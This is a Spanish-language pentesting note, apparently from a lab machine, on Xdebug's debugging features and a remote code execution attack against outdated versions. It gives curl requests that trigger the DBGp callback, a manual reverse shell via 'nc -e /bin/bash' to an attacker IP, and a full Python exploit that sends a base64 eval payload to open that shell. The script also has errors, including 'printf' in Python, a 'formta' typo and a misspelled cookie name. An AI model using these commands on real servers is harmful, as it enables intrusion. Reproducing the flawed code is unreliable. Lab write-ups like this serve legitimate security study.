Xdebug es una extensión de PHP que proporciona la capacidad de depuración código y errores. Utiliza DBGp que es protocolo de depuración simple que se usa para comunicar el motor de depuración propio de php con un cliente, normalmente un IDE.

La información que Xdebug puede proporcionar es la siguiente:

-   Se puede apilar rastros de mensajes de error con:
    -   Exhibición de parámetro lleno para usuaria definió funciones
    -   Nombre de función, nombre de archivo e indicaciones de línea
    -   Soporte para funciones de miembro

-   Información de la memoria asignada.
-   Protección para recursiones infinitas
-   profiling Información para guiones de PHP
-   Análisis de cobertura del código
-   Capacidades para depurar vuestros guiones interactivamente con un frente de depurador-fin.


** Ataque sobre Xdebug **
https://github.com/mikaelkall/exploits/tree/master/php/xdebug_rce

Una versión desactualizada de Xdebug permite la ejecución remota de comandos (RCE). Esta vulnerabilidad principalmente es utilizada para que el equipo afectada realice una comunicación con un equipo remoto. 

Pasos del ataque:
1.- El exploit nos abre un socket en la máquina local atacante, con el puerto 9000 en escucha. 
	Realiza una petición al servidor objetivo vulnerable con un parámetro en la cabecera:
	'Cookie' : 'XDEBUG_SESSION=' + rand_text_alphanumeric(10)
2.- El servidor al recibir la petición con la cabecera XDebug lanza una petición al puerto 9000 
	donde tenemos el socket abierto por el exploit.
	Ejemplo de petición con curl:
	`curl http://10.10.10.83/index.php -H "Cookie: XDEBUG_SESSION=loquesea"`
3.- Sobre el socket abierto vemos que utiliza la función eval() de php, ampliamente conocida 							
	por ser vulnerable para mandar desde el socket una data encodeada en base64. Esta data 		puede ser introducida por el atacante.
	Si revisamos el código de metasploit, vemos que utiliza la función system() para enviar comandos del sistema encapsulado en la función eval() de php.
4.- En la ventana donde se ejecuta el socket abierto podemos introducir:
	`system("whoami")`
5.- En otra ventana hacemos la petición al servicio vulnerable:
	`curl http://10.10.10.83/index.php -H "Cookie: XDEBUG_SESSION=loquesea"`
6.- En esta última ventana recibimos el resultado de la ejecución "whoami".

Resumen:
	Cuando se le hace una petición con la cabecera XDebug al servicio vulnerable, este conecta con el socket que tenemos en el puerto 9000. Como en este socket podemos mandar comandos, estos comandos son ejecutados por el servidor vulnerable y devueltos en la petición de la consulta.
	
	
 ** Obtener una reverse-shell de forma manual **
1.- Puerto en escucha en local con netcat --> `rlwrap nc -nlvp 443`
2.- Comando sobre el socket --> `system("nc -e /bin/bash 10.10.14.55 443")`
3.- Petición al servicio web con cabecera XDebug --> `curl http://10.10.10.83/index.php -H "Cookie: XDEBUG_SESSION=loquesea"`


** Exploit mejorado para vulnerabiidad XDebug **
```
#/usr/bin/python3

import socket, requests, sys
from base64 import b64encode

if len(sys.argv) != 2:
	printf("\n[*] Uso: python3 {} <puerto>\n".format(sys.argv[0]))
	sys.exit(1)
	
ip = "10.10.14.55"
port = sys.argv[1]

#Start listener

local_ip = "0.0.0.0"
local_port = 9000

printf("\n[*] Starting listener on {}:{}".format(local_ip, local_port))

sk = socket.socket()
sk.bind((local_ip, local_port))
sk.listen(10)

print("\n[*] Listening...")
print("\n[*] Sending request... \n")

try:
	r = requests.get("http://10.10.10.83/index.php", headers={"Cookie":"XDEBUG_SESSSION=s4vitar"}, timeout=2)
except:
	pass
	
#Catch callback

conn, addr = sk.accept()
client_data = conn.recv(1024)

printf("\n[*] Connection received from {}:{} on port {}".formta(addr[0], addr[1], local_port))

cmd = 'system("nc -e /bin/bash {} {}")'.format(ip, port).encode('utf-8')

conn.sendall(('eval -i 1 -- %s\x00' % b64encode(cmd).decode('utf-8')).encode('utf-8'))

sk.close()
conn.close()

```



